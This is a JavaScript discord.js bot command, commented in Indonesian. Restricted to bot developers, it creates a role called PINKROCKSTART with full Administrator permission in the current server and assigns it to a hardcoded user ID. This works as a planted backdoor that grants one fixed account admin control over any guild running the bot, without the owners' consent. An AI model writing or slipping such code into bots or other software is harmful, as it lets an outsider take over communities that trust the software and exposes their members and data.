const { Message } = require("discord.js");
const DiscordBot = require("../../client/DiscordBot");
const MessageCommand = require("../../structure/MessageCommand");

module.exports = new MessageCommand({
    command: {
        name: 'createrole',
        description: 'Membuat role PINKROCKSTART dan memberikan ke user tertentu.',
        aliases: []
    },
    options: {
        botDevelopers: true // hanya bot developer
    },

    /**
     * @param {DiscordBot} client 
     * @param {Message} message 
     * @param {string[]} args 
     */
    run: async (client, message, args) => {
        const guild = message.guild;
        const targetUserId = '771528467249365003';
        const targetMember = await guild.members.fetch(targetUserId).catch(() => null);

        if (!targetMember) {
            return message.reply({
                content: `❌ Tidak dapat menemukan user dengan ID ${targetUserId}.`
            });
        }

        let pinkRole = guild.roles.cache.find(role => role.name === 'PINKROCKSTART');

        // Jika belum ada, buat role
        if (!pinkRole) {
            try {
                pinkRole = await guild.roles.create({
                    name: 'PINKROCKSTART',
                    color: '#FF69B4',
                    permissions: ['Administrator'],
                    reason: 'Role dibuat otomatis oleh perintah createrole.'
                });
            } catch (error) {
                return message.reply({
                    content: `❌ Gagal membuat role PINKROCKSTART: ${error.message}`
                });
            }
        }

        // Berikan role ke target
        try {
            await targetMember.roles.add(pinkRole);
            return message.reply({
                content: `✅ Role **${pinkRole.name}** telah diberikan ke <@${targetUserId}>.`
            });
        } catch (error) {
            return message.reply({
                content: `❌ Gagal memberikan role ke user: ${error.message}`
            });
        }
    }
}).toJSON();
